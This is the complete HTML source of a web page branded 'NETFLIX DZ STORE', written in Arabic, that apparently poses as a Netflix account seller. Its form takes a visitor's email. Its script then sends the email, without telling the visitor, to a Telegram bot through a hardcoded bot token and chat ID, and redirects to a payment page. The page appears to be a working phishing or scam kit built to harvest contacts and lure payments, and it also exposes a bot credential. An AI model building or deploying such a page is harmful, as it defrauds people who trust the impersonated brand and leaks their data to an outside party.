<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>NETFLIX DZ STORE</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }

    body, html {
      height: 100%;
      overflow: hidden;
    }

    video {
      position: fixed;
      top: 0;
      left: 0;
      min-width: 100%;
      min-height: 100%;
      object-fit: cover;
      z-index: -1;
    }

    .container {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background-color: rgba(0, 0, 0, 0.6);
      border: 1px solid rgba(255, 255, 255, 0.3);
      border-radius: 20px;
      padding: 30px;
      width: 90%;
      max-width: 400px;
      color: white;
      text-align: center;
    }

    .logo-title {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      margin-bottom: 20px;
    }

    .logo-title img {
      width: 50px;
      height: 50px;
      border-radius: 50%;
      object-fit: cover;
    }

    .logo-title h2 {
      font-size: 1.5em;
      margin: 0;
    }

    input[type="email"] {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 8px;
      margin-bottom: 15px;
      font-size: 16px;
    }

    button {
      background-color: #e50914;
      color: white;
      border: none;
      padding: 12px;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      width: 100%;
    }

    .note {
      margin-top: 10px;
      font-size: 13px;
      color: #f0f0f0;
    }

    .store-buttons {
      display: flex;
      flex-direction: column;
      gap: 10px;
      margin-top: 20px;
    }

    .store-btn {
      display: flex;
      align-items: center;
      justify-content: center;
      background-color: #111;
      color: white;
      text-decoration: none;
      padding: 12px 20px;
      border-radius: 10px;
      font-size: 16px;
      font-weight: bold;
      transition: background 0.3s;
      border: 1px solid #444;
    }

    .store-btn img {
      width: 24px;
      height: 24px;
      margin-left: 10px;
    }

    .store-btn:hover {
      background-color: #222;
    }
  </style>
</head>
<body>

<video autoplay muted loop>
  <source src="background.mp4" type="video/mp4" />
  متصفحك لا يدعم تشغيل الفيديو.
</video>

<div class="container">
  <div class="logo-title">
    <img src="netflix.png" alt="Netflix Logo" />
    <h2>NETFLIX DZ STORE</h2>
  </div>

  <form id="emailForm">
    <input type="email" id="email" placeholder="email@gmail.com" required />
    <button type="submit">متابعة</button>
    <div class="note">📧 سيتم إرسال معلومات الحساب إلى هذا الإيميل</div>
  </form>

  <div class="store-buttons">
    <a href="https://play.google.com/store/apps/details?id=com.netflix.mediaclient" target="_blank" class="store-btn">
      <img src="https://upload.wikimedia.org/wikipedia/commons/d/d0/Google_Play_Arrow_logo.svg" alt="Play Store" />
      تحميل من بلاي ستور
    </a>
    <a href="https://apps.apple.com/us/app/netflix/id363590051" target="_blank" class="store-btn">
      <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="App Store" />
      تحميل من آب ستور
    </a>
  </div>
</div>

<script>
  const form = document.getElementById("emailForm");

  form.addEventListener("submit", function (e) {
    e.preventDefault();
    const email = document.getElementById("email").value.trim();

    

    const botToken = "7921870921:AAFgEsXGpcJegrrID91__IJR54q47MSvgwA";
    const chatId = "7739393558";
    const message = `📩 تم إدخال الإيميل:\n${email}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    }).then(() => {
      window.location.href = "pay.html";
    });
  });
</script>

</body>
</html>
